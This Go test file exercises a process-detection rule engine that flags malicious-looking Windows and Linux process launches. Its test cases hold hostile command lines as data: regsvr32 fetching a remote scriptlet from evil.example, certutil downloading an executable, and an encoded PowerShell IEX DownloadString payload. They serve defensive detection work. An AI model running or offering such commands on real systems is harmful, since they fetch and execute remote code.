package detect

import (
	"encoding/base64"
	"testing"
	"unicode/utf16"

	"github.com/HPK13/proctrace/internal/event"
	"github.com/HPK13/proctrace/internal/lineage"
	"github.com/HPK13/proctrace/rules"
)

func proc(name, path, cmd, parent string) event.Process {
	p := event.Process{PID: 1234, PPID: 1000, Name: name, Executable: path, CommandLine: cmd}
	if parent != "" {
		p.Parent = &event.Parent{PID: 1000, Name: parent}
		p.ParentStatus = lineage.StatusVerified
	} else {
		p.ParentStatus = lineage.StatusExited
	}
	return p
}

func withOriginal(p event.Process, original string) event.Process {
	p.PE = &event.PE{OriginalFileName: original}
	return p
}

// psEncode builds a PowerShell -EncodedCommand payload (Base64 of UTF-16LE).
func psEncode(script string) string {
	u := utf16.Encode([]rune(script))
	b := make([]byte, 2*len(u))
	for i, c := range u {
		b[2*i], b[2*i+1] = byte(c), byte(c>>8)
	}
	return base64.StdEncoding.EncodeToString(b)
}

func TestDefaultRules(t *testing.T) {
	e, err := Load(rules.Default, "embedded")
	if err != nil {
		t.Fatal(err)
	}
	const sys = `C:\Windows\System32\`
	const ps = sys + `WindowsPowerShell\v1.0\powershell.exe`
	tests := []struct {
		name string
		p    event.Process
		want []string // rule IDs expected, in any order
	}{
		{"word spawns powershell", proc("powershell.exe", ps, "powershell.exe -nop", "WINWORD.EXE"), []string{"PT-W001"}},
		{"normal svchost", proc("svchost.exe", sys+"svchost.exe", "", "services.exe"), nil},
		{"svchost wrong parent", proc("svchost.exe", sys+"svchost.exe", "", "explorer.exe"), []string{"PT-W002"}},
		{"svchost unknown parent does not fire", proc("svchost.exe", sys+"svchost.exe", "", ""), nil},
		{"svchost outside system32", proc("svchost.exe", `C:\Users\bob\AppData\Local\Temp\svchost.exe`, "", "services.exe"), []string{"PT-W004", "PT-W013"}},
		{"lookalike scvhost", proc("scvhost.exe", `C:\Users\Public\scvhost.exe`, "", "explorer.exe"), []string{"PT-W005", "PT-W013"}},
		{"lookalike with space", proc("lsass .exe", `C:\ProgramData\lsass .exe`, "", "explorer.exe"), []string{"PT-W005", "PT-W013"}},
		{"cyrillic homoglyph", proc("svchоst.exe", "", "", ""), []string{"PT-W005", "PT-W006"}},
		{"encoded powershell", proc("powershell.exe", "", "powershell -w hidden -enc SQBFAFgA", "cmd.exe"), []string{"PT-W007"}},
		{"plain powershell", proc("powershell.exe", "", "powershell.exe -File build.ps1", "explorer.exe"), nil},
		{"squiblydoo", proc("regsvr32.exe", "", `regsvr32 /s /n /u /i:http://evil.example/x.sct scrobj.dll`, "cmd.exe"), []string{"PT-W009"}},
		{"linux webshell", proc("sh", "/usr/bin/dash", "sh -c id", "nginx"), []string{"PT-L001"}},
		{"swapped letters svhcost", proc("svhcost.exe", `C:\Users\Public\x\svhcost.exe`, "", "explorer.exe"), []string{"PT-W005", "PT-W013"}},
		{"missing letter svhost", proc("svhost.exe", `D:\svhost.exe`, "", "explorer.exe"), []string{"PT-W005"}},
		{"real sihost is not a lookalike (seen on Windows 11)",
			withOriginal(proc("sihost.exe", sys+"sihost.exe", "sihost.exe", "svchost.exe"), "sihost.exe"), nil},
		{"real LsaIso is not a lookalike (seen on Windows 11)", proc("LsaIso.exe", "", "", "wininit.exe"), nil},
		{"two edits scvhst in Temp", proc("scvhst.exe", `C:\Users\bob\AppData\Local\Temp\scvhst.exe`, "", "explorer.exe"), []string{"PT-W015", "PT-W013"}},
		{"two edits lsass64 on D:", proc("lsass64.exe", `D:\tools\lsass64.exe`, "", "explorer.exe"), []string{"PT-W015"}},
		{"real sihost copied to Temp", proc("sihost.exe", `C:\Users\bob\AppData\Local\Temp\sihost.exe`, "", "explorer.exe"), []string{"PT-W015", "PT-W013"}},
		{"real iexplore is not a lookalike", proc("iexplore.exe", `C:\Program Files\Internet Explorer\iexplore.exe`, "", "explorer.exe"), nil},
		{"real taskhost in System32 (Windows 7)", proc("taskhost.exe", sys+"taskhost.exe", "", "services.exe"), nil},
		{"taskhost outside System32", proc("taskhost.exe", `D:\taskhost.exe`, "", "explorer.exe"), []string{"PT-W005"}},
		{"real explorer is not a lookalike", proc("explorer.exe", `C:\Windows\explorer.exe`, "", "userinit.exe"), nil},

		// Evasion cases fixed in v0.2.
		{"-enco prefix of -EncodedCommand", proc("powershell.exe", ps, "powershell -enco SQBFAFgA", "explorer.exe"), []string{"PT-W007"}},
		{"unicode en dash", proc("powershell.exe", ps, "powershell \u2013encodedcommand SQBFAFgA", "explorer.exe"), []string{"PT-W007"}},
		{"concatenated IEX", proc("powershell.exe", ps, `powershell -c "I"+"EX"(gc x.txt)`, "explorer.exe"), []string{"PT-W007"}},
		{"backtick obfuscation", proc("powershell.exe", ps, "powershell -c i`e`x (gc x.txt)", "explorer.exe"), []string{"PT-W007"}},
		{"renamed powershell spawned by word",
			withOriginal(proc("update.exe", `C:\Users\bob\Downloads\update.exe`, "update.exe -nop", "WINWORD.EXE"), "PowerShell.EXE.MUI"),
			[]string{"PT-W001", "PT-W014"}},
		{"renamed certutil downloading",
			withOriginal(proc("svc.exe", `D:\tools\svc.exe`, "svc.exe -urlcache -f http://x/a.exe a.exe", "cmd.exe"), "CertUtil.exe"),
			[]string{"PT-W010", "PT-W014"}},
		{"real powershell is not renamed", withOriginal(proc("powershell.exe", ps, "powershell -File a.ps1", "explorer.exe"), "PowerShell.EXE.MUI"), nil},
		{"defender platform excepted",
			proc("MsMpEng.exe", `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2\MsMpEng.exe`, "", "services.exe"), nil},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			dets, score := e.Evaluate(tc.p)
			got := map[string]bool{}
			for _, d := range dets {
				got[d.RuleID] = true
			}
			if len(got) != len(tc.want) {
				t.Fatalf("got %v, want %v", dets, tc.want)
			}
			for _, id := range tc.want {
				if !got[id] {
					t.Fatalf("missing %s; got %v", id, dets)
				}
			}
			if len(tc.want) == 0 && score != 0 {
				t.Fatalf("score %d for clean process", score)
			}
		})
	}
}

func TestEditDistance(t *testing.T) {
	cases := []struct {
		a, b string
		want int
	}{
		{"scvhost.exe", "svchost.exe", 1}, // adjacent swap counts once
		{"svhost.exe", "svchost.exe", 1},
		{"sihost.exe", "svchost.exe", 2},
		{"lsaiso.exe", "lsass.exe", 2},
		{"lsass .exe", "lsass.exe", 1},
		{"abc", "abc", 0},
	}
	for _, c := range cases {
		if got := editDistance(c.a, c.b); got != c.want {
			t.Errorf("editDistance(%q, %q) = %d, want %d", c.a, c.b, got, c.want)
		}
	}
}

func TestEncodedPayloadIsDecoded(t *testing.T) {
	e, err := New([]Rule{{ID: "dl", Score: 50, Match: Match{
		Name:             []string{"powershell.exe"},
		CommandLineRegex: []string{"downloadstring"},
	}}})
	if err != nil {
		t.Fatal(err)
	}
	payload := psEncode("IEX (New-Object Net.WebClient).DownloadString('http://x/a')")
	dets, _ := e.Evaluate(proc("powershell.exe", "", "powershell -NoP -e "+payload, "explorer.exe"))
	if len(dets) != 1 {
		t.Fatalf("expected detection from decoded payload, got %v", dets)
	}
	if want := "decoded -EncodedCommand payload matches downloadstring"; dets[0].Reason != "process powershell.exe; "+want {
		t.Fatalf("reason = %q", dets[0].Reason)
	}
}

func TestNormalizeCommandLine(t *testing.T) {
	cases := map[string]string{
		`cmd /c p^o^w^e^r^s^h^e^l^l -c "x"`: `cmd /c powershell -c x`,
		"a   b\t c":                         "a b c",
		"\u2014enc":                         "-enc",
		`'Down'+'loadString'`:               "DownloadString",
	}
	for in, want := range cases {
		if got := NormalizeCommandLine(in); got != want {
			t.Errorf("NormalizeCommandLine(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestExceptSuppresses(t *testing.T) {
	e, err := New([]Rule{{ID: "x", Score: 10,
		Match:  Match{PathContains: []string{`\temp\`}},
		Except: &Match{PathPrefix: []string{`c:\temp\trusted\`}},
	}})
	if err != nil {
		t.Fatal(err)
	}
	if d, _ := e.Evaluate(proc("a.exe", `C:\Temp\trusted\a.exe`, "", "")); d != nil {
		t.Fatalf("except did not suppress: %v", d)
	}
	if d, _ := e.Evaluate(proc("a.exe", `C:\Temp\other\a.exe`, "", "")); len(d) != 1 {
		t.Fatalf("rule did not fire outside the exception: %v", d)
	}
}

func TestRiskScore(t *testing.T) {
	e, err := New([]Rule{
		{ID: "a", Score: 70, Match: Match{Name: []string{"x.exe"}}},
		{ID: "b", Score: 30, Match: Match{Name: []string{"x.exe"}}},
		{ID: "c", Score: 99, Match: Match{Name: []string{"x.exe"}}},
	})
	if err != nil {
		t.Fatal(err)
	}
	dets, score := e.Evaluate(event.Process{Name: "X.EXE"})
	if dets[0].RuleID != "c" || score != 100 {
		t.Fatalf("top=%s score=%d, want c / 100", dets[0].RuleID, score)
	}
}

func TestLookalikeEditsValidated(t *testing.T) {
	if _, err := New([]Rule{{ID: "x", Match: Match{NameLookalike: []string{"a.exe"}, LookalikeEdits: 3}}}); err == nil {
		t.Fatal("name_lookalike_edits 3 accepted")
	}
}

func TestDuplicateIDRejected(t *testing.T) {
	_, err := New([]Rule{{ID: "a", Match: Match{Name: []string{"x"}}}, {ID: "a", Match: Match{Name: []string{"y"}}}})
	if err == nil {
		t.Fatal("expected duplicate id error")
	}
}